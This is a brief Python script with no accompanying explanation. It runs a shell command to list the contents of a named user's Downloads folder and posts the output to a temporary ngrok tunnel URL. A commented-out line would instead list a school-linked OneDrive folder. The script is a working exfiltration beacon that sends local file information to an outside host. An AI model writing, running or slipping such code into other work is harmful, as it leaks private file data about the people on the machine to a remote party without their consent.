#!/usr/bin/python3
import os, requests, subprocess

user = os.environ["USER"]
# files = os.listdir("/Users/011935/OneDrive - King's Christian College")

response = requests.post(
    "https://37fb24483abd.ngrok-free.app/log/011935",
    data={
        "msg": subprocess.getoutput('cd /Users/011935/Downloads && ls') #'\n'.join(files)
    }
)
